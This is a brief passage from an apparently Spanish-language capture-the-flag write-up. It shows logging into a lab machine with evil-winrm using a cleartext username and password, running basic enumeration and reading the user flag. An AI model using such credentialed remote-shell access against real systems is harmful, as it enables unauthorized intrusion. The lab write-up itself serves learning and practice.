## Vuln exploit & Gaining Access {-}

### Coneccion con EVIL-WINRM {-}


```bash
evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
whoami
ipconfig
type ../Desktop/user.txt
```

Ya podemos leer la flag.
